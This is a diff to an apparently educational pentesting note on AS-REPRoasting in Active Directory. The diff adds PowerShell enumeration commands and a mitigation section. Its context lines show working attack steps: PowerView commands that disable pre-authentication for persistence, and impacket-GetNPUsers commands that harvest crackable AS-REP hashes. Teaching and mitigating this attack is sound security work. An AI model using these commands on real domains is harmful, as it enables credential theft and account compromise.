@@ -6,6 +6,7 @@
 - [From Linux](#from-linux)
 	- [Enumeration](#enumeration)
 	- [Exploitation](#exploitation)
+- [Mitigation](#mitigation)
 
 ---
 
@@ -20,8 +21,7 @@
 
 <img src="/assets/preauth_not_reqd_mmorgan.webp" style="display: block; margin:auto; width:80%; height:60%;">
 
-
-AS-REPRoasting can be use for:
+AS-REPRoasting can be used for:
 
 - `Persistence`: setting the bit `DONT_REQ_PREAUTH` flag on accounts would allow attackers to regain access to domain account even after a password reset.
 - `Privilege Escalation`: When an attacker has the ability change any attribute of an account but not the ability to log in without knowing or resetting the password. Password resets are dangerous as they have a high probability of raising alarms. Instead of resetting the password, attackers can enable this bit and attempt to crack the account's password hash.
@@ -40,7 +40,9 @@ PS C:\> Set-DomainObject -Identity <samAccountName> -XOR @{useraccountcontrol=41
 
 ```powershell
 # Using ActiveDirectory module:
-PS C:\> Get-ADUser -Filter { (UserAccountControl -band 4194304) -and (Enabled -eq $true) } -Properties * | Select SamAccountName,userAccountControl,userprincipalname | fl
+Get-ADUser -Filter { (UserAccountControl -band 4194304) -and (Enabled -eq $true) } -Properties * | Select SamAccountName,userAccountControl,userprincipalname | fl
+# Or
+Get-ADUser -filter * -properties DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq "True" -and $_.Enabled -eq "True"} | select Name 
 
 # Using Powerview
 PS C:\> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
@@ -88,4 +90,19 @@ $ impacket-GetNPUsers corp.local/'USERNAME':'PASSWORD' -request -outputfile hash
 # With a list of valid users and whithout authenticatation
 $ impacket-GetNPUsers corp.local/  -dc-ip 172.16.5.5 -no-pass -usersfile users.txt -format hashcat -outputfile out.txt 
 ```
+
+---
+### Mitigation
+
+- Don't set users with Kerberos pre-authentication disabled. Some service accounts may require it (older protocols), but enable pre-authentication for all accounts where possible.
+- Ensure the use of strong encryption algorithms with Kerberos. Move away from RC4.
+- Protect and monitor Service Accounts with strong passwords and watch logs for unusual activity from these accounts (access files or resources not commonly utilized).
+
+Once accounts have been identified with enabled `Do not require Kerberos preauthentication` to mitigate it:
+
+- Open `Active Directory Users and Computers`
+- Select the user we wish to investigate and then go to the Account tab. 
+	- Look in the Account options scroll box for the line `Do not require Kerberos preauthentication`.
+		- If this box is checked, uncheck it.
+
 ---
